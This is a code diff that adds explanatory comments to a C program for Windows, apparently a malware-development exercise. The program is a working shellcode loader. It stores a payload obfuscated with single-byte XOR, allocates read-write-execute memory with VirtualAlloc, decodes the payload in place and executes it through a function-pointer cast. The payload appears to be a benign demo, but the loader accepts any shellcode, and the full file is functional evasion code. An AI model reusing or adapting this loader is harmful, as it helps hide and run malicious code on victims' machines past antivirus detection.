@@ -1,3 +1,5 @@
+/* Using XOR to obfuscate a payload with a single byte key */
+
 #include <Windows.h>
 #include <stdio.h>
 
@@ -30,7 +32,7 @@ PBYTE payload = "\xb9\x0d\xc4\xa1\xb5\xba\xba\xba\xad\x95\x45\x45\x45\x04"
 				"\x65\x00\x01\x17\x65\x00\x33\x24\x36\x2c\x2a\x2b\x45\x30"
 				"\x36\x20\x37\x76\x77\x6b\x21\x29\x29\x45";
 
-
+// Performs XOR against the payload using the given key. Modifies the payload in place.
 PBYTE xor_payload(PBYTE payload, SIZE_T payload_size, BYTE key) {
 	for (SIZE_T i = 0; i < payload_size; i++) {
 		payload[i] ^= key;
@@ -41,18 +43,23 @@ PBYTE xor_payload(PBYTE payload, SIZE_T payload_size, BYTE key) {
 
 int main(void) {
 
+	// Allocate memory that has read, write, and execute permission.
 	PBYTE executable_memory = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
+	// If memory failed to be allocated
 	if (executable_memory == NULL) {
 		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
 		return -1;
 	}
-
+	
+	// Copy the encrypted payload into the allocated memory
 	memcpy(executable_memory, payload, payload_size);
 
+	// Decrypt the payload in place
 	xor_payload(executable_memory, payload_size, 0x45);
 
+	// Execute the shellcode using pointer magic
 	(*(VOID(*)()) executable_memory)();
 
+	// Wait for user input
 	getchar();
 }
